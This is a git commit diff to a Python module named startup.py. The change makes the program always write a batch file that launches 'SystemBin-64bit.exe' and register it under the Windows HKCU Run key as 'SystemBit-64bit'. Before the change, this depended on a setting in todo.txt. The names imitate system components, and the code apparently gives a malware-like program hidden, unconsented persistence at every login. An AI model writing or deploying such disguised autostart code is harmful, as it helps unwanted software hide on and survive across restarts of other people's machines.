e79bf60643be814e2ce48f2bec4f1d9fbd5f0049
Josakko <112590914+Josakko@users.noreply.github.com>
2023-04-26 18:00:22 +0200

    Update startup.py

--- modules/startup.py
+++ modules/startup.py
@@ -1,33 +1,19 @@
 import subprocess
 import os
-import getpass
 
 
 class StartUp:
-    def create_batch(self):
+    def run(self):
+        self.dir = os.getcwd()
         with open(f"{self.dir}/run.bat", "w") as f:
             f.write("@echo off")
-            f.write(f'\nstart "" "{self.dir}"')
+            f.write(f'\nstart "" "{self.dir}\SystemBin-64bit.exe"')
         self.reg_edit()
             
     def reg_edit(self):
         subprocess.run(args=["reg", "delete", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "/v", "SystemBit-64bit", "/f"], shell=True)
         subprocess.run(args=["reg", "add", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "/v", "SystemBit-64bit", "/t", "REG_SZ", "/d", f"{self.dir}\\run.bat", "/f"], shell=True)
     
-    def run(self):
-        try:
-            with open("todo.txt", "r") as f:
-                startup = f.readlines()[4]
-        except:
-            startup = False
-            
-        if not startup or startup == "False":
-            return
-        elif startup == "True":
-            self.dir = os.getcwd()
-            self.create_batch()
-        else:
-            return
         
 #startup = StartUp()
 #startup.run()
